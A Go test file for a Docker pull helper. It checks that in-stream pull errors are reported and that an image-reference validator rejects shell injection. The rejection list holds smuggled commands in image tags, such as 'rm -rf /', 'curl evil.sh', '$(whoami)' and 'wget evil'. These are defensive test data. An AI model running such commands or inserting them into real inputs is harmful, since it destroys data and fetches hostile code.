package docker

import (
	"io"
	"strings"
	"testing"
)

func TestDrainPullReportsInStreamErrors(t *testing.T) {
	tests := []struct {
		name    string
		stream  string
		wantErr string
	}{
		{
			name:   "successful pull",
			stream: `{"status":"Pulling from org/app"}` + "\n" + `{"status":"Download complete"}`,
		},
		{
			// The daemon returns 200 and only then reports that the tag does
			// not exist, so this is the case that used to pass silently.
			name:    "missing tag",
			stream:  `{"status":"Pulling"}` + "\n" + `{"error":"manifest for org/app:v9 not found"}`,
			wantErr: "manifest for org/app:v9 not found",
		},
		{
			name:    "rejected credentials",
			stream:  `{"error":"unauthorized: authentication required"}`,
			wantErr: "unauthorized",
		},
		{
			name:    "truncated stream",
			stream:  `{"status":"Pulling`,
			wantErr: "unexpected EOF",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := drainPull(io.NopCloser(strings.NewReader(tc.stream)))
			switch {
			case tc.wantErr == "" && err != nil:
				t.Fatalf("unexpected error: %v", err)
			case tc.wantErr != "" && err == nil:
				t.Fatalf("expected an error containing %q", tc.wantErr)
			case tc.wantErr != "" && !strings.Contains(err.Error(), tc.wantErr):
				t.Fatalf("error %q should contain %q", err, tc.wantErr)
			}
		})
	}
}

// The tag reaches a shell inside the updater container, and it comes from a
// GitHub release name.
func TestSafeImageRef(t *testing.T) {
	valid := []string{
		"ghcr.io/aymericchaverot/quasar:v1.2.3",
		"ghcr.io/org/app@sha256:abc123",
		"nginx:latest",
	}
	for _, ref := range valid {
		if !safeImageRef(ref) {
			t.Errorf("%q should be accepted", ref)
		}
	}

	invalid := []string{
		"",
		"ghcr.io/org/app:v1;rm -rf /",
		"ghcr.io/org/app:v1 && curl evil.sh",
		"ghcr.io/org/app:$(whoami)",
		"ghcr.io/org/app:`id`",
		"ghcr.io/org/app:v1\nwget evil",
	}
	for _, ref := range invalid {
		if safeImageRef(ref) {
			t.Errorf("%q should be rejected", ref)
		}
	}
}
